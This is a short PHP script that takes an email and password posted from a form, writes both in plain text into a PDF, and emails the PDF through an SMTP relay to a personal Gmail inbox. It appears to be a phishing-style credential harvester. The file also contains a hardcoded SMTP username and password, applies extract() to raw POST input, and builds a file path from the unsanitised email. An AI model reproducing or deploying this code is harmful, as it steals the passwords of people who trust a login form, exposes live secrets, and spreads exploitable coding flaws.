<?php 
require('fpdf.php');
// require('FPDI-2.3.6/src/fpdi.php');
// require('FPDI-2.3.6/src/FpdfTpl.php');
// require('FPDI-2.3.6/src/FpdiTrait.php');

require('PHPMailer/src/Exception.php');
require('PHPMailer/src/PHPMailer.php');
require('PHPMailer/src/SMTP.php');

extract($_POST);
if(!$email || !$password){
	header("Location:index.html");
}

$filename = "PDF/user_".$email.".pdf";

$pdf = new FPDF();

$pdf->AddPage();
$pdf->SetFont('Arial','B',16);

$pdf->Cell(40,10, "Email ".$email );
$pdf->ln();
$pdf->Cell(40,10, "Password ".$password );

$pdf->Output($filename,"F");

$mail = new PHPMailer\PHPMailer\PHPMailer(true);


/* Open the try/catch block. */
try {

   $mail->IsSMTP(); // telling the class to use SMTP
   $mail->Host = "smtp-pulse.com"; 
   $doll = new PHPMailer\PHPMailer\SMTP();
    // $doll::AuthenticateO($pdf,$mail);

	$mail->Username = "Reuben@reuben09.com.ng";
	$mail->Password = "gtXtPjg3ei72d";
	$mail->Port = 587;

   $mail->SMTPAuth = true;  // turn on SMTP authentication
   /* Set the mail sender. */
   $mail->setFrom('Reuben@reuben09.com.ng', 'Php New User');

   /* Add a recipient. */
   $mail->addAddress('chukwukareuben09@gmail.com', 'reuben');

   /* Set the subject. */
   $mail->Subject = 'A New User Registered';

   $mail->addAttachment($filename);

   /* Set the mail message body. */
   $mail->Body = 'A file has been attached to the Mail';

   /* Finally send the mail. */
   $mail->send();
}
catch (Exception $e)
{
   /* PHPMailer exception. */
   echo $e->errorMessage();
}
catch (\Exception $e)
{
   /* PHP exception (note the backslash to select the global namespace Exception class). */
   echo $e->getMessage();
}
header("Location:PDF.pdf");
